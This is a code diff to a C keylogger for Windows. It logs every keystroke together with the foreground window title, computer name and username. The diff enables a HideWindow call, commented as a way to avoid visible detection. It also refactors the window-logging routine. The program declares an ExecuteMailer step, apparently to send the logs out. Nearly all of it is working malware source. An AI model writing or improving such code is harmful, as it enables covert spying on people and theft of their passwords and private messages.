@@ -15,14 +15,14 @@ char* GetTime();
 void HideWindow();
 void InitLogfile(char* filename);
 int GetLogfileLength(char* filename);
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
 void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
     // avoid visible detection of executable window
-    //HideWindow();
+    HideWindow();
 
     // install executables
     char mailer_path[MAX_PATH];
@@ -55,7 +55,7 @@ int main(){
 
                 // open keylog file then handle keystroke
                 FILE* logfile = fopen(logfile_path, "a");
-                GetCurrentWindow(window, new_window, logfile, 0);
+                GetCurrentWindow(window, new_window, logfile);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
             }
@@ -172,7 +172,8 @@ void InitLogfile(char* filename){
     // open clean logfile and print out header
     FILE* logfile = fopen(filename, "w");
     fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
-    GetCurrentWindow(window, window, logfile, 1);
+    fprintf(logfile, "WINDOW: %s\nTIME: %s", window, GetTime());
+    fflush(logfile);
     fclose(logfile);
 }
 
@@ -189,16 +190,9 @@ int GetLogfileLength(char* filename){
 }
 
 // get the current working window of the user
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile){
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
     HWND new_foreground = GetForegroundWindow();
     GetWindowText(new_foreground, window, BUF_SIZE);
-    
-    // display current window and time for clean logfile instance
-    if(init_logfile == 1){
-        fprintf(logfile, "WINDOW: %s\nTIME: %s", new_window, GetTime());
-        fflush(logfile);
-        return;
-    }
 
     // check if window has changed/updated
     if(strcmp(window, new_window)){
